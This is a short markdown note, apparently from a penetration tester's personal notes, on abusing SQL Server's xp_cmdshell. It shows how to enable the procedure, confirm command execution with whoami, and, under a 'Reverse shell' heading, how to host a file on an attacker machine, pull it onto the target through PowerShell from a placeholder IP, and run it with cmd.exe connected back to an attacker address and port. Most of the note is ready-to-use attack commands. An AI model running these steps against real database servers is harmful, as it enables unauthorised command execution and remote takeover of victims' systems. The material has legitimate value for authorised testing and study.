---
id: xp_cmdshell
aliases: []
tags:
  - SQL
links: "[[SQL]]"
---

# xp_cmdshell

[xp_cdmshell (Transact-SQL)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17)
allows the execution of Windows command shell commands directly from the SQL
Server environment.

## Activation

**xp_cmdshell** is desabled by default

```sh
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

## Usage

Check if xp_cmdshell is enabled

```sh
EXEC xp_cmdshell 'whoami';
```

## Reverse shell

Simple [Python HTTP server](https://docs.python.org/3/library/http.server.html)
to serve a file from the attacker machine

```sh
sudo python3 -m http.server 80
```

Acquire the file served by the attacker from the target

```sh
xp_cmdshell "powershell -c cd C:\Users\{user}\Downloads; wget http:{ip_address}/{file_name} -outfile {file_name}"
```

Execute the acquired file on the target

```sh
xp_cmdshell "powershell -c cd C:\Users\{user}\Downloads; .\{file_name} -e cmd.exe {attacker_ip} {attacker_port}"
```
